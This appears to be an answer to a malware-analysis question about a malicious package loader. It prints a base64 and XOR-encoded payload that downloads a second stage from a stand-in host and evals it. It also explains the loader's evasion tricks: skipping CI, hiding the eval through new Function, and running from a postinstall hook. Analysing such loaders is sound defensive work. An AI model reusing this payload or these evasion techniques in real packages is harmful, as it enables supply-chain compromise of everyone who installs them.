The answer is `https://api.tokenvault-update.invalid/stage2.bin`.

The string is base64, and the decoded bytes are XORed with the single-byte key `0x2b`. In a shell:

```bash
echo 'TU5fSEMDCUNfX1tYEQQESltCBV9EQE5FXUpeR18GXltPSl9OBUJFXUpHQk8EWF9KTE4ZBUlCRQkCBV9DTkUDWRYVWQVKWVlKUmleTU1OWQMCAgVfQ05FA0kWFU5dSkcDRU5cC39OU19vTkhET05ZAwIFT05IRE9OA0kCAgI=' \
  | base64 -d | python3 -c 'import sys; print(bytes(b ^ 0x2b for b in sys.stdin.buffer.read()).decode())'
```

The decoded text downloads a second file and passes it straight to `eval`. That is the actual malware, and it is not in the package at all, so a scan of the published source finds nothing.

Things worth noticing in the loader itself:

- **`process.env.CI !== "true"`.** It skips execution in CI, so automated test runs and many sandboxes never see the behavior.
- **`new Function(...)`.** An `eval` alternative, used so that the decoded string is never visible in the source.
- **A postinstall hook.** The code runs at install time, before anyone has imported the package.

Single-byte XOR plus base64 is not meant to resist analysis. It only defeats string searches for the URL.
